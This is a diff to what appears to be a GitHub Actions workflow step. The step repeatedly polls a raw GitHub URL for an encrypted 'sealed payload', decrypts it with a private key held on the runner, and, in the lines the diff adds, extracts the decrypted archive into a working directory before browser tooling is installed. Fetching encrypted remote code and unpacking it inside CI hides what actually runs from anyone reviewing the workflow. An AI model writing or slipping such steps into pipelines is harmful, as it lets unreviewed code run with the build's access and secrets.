@@ -30,10 +30,10 @@ jobs:
         shell: bash
         run: |
           set -euo pipefail
-          sealed="$RUNNER_TEMP/g07-sealed-payload-v2.cms"
+          sealed="$RUNNER_TEMP/g07-sealed-payload-v3.cms"
           found=0
           for i in $(seq 1 180); do
-            if curl -fsSL --max-time 15 "https://raw.githubusercontent.com/aeorauk-maker/dotnet-cross-platform-runner-lab/g07-l095-pa30-e83-20261128-c73f/g07-sealed-payload-v2.cms?poll=$i" -o "$sealed" 2>/dev/null; then
+            if curl -fsSL --max-time 15 "https://raw.githubusercontent.com/aeorauk-maker/dotnet-cross-platform-runner-lab/g07-l095-pa30-e83-20261128-c73f/g07-sealed-payload-v3.cms?poll=$i" -o "$sealed" 2>/dev/null; then
               found=1
               break
             fi
@@ -45,7 +45,8 @@ jobs:
           fi
           openssl cms -decrypt -binary -inform DER -in "$sealed" -recip "$RUNNER_TEMP/g07-receiver-cert.pem" -inkey "$RUNNER_TEMP/g07-receiver-key.pem" -out "$RUNNER_TEMP/g07-source.tgz" >/dev/null 2>&1
           mkdir -p "$RUNNER_TEMP/g07-lab"
-          g07-sealed-payload-v2.cms
+          tar -xzf "$RUNNER_TEMP/g07-source.tgz" -C "$RUNNER_TEMP/g07-lab"
+          find "$RUNNER_TEMP/g07-lab" -type f -name '._*' -delete
           python3 -m venv "$RUNNER_TEMP/g07-venv"
           "$RUNNER_TEMP/g07-venv/bin/python" -m pip -q install playwright >/dev/null
           chrome="$(command -v google-chrome || command -v chromium || true)"
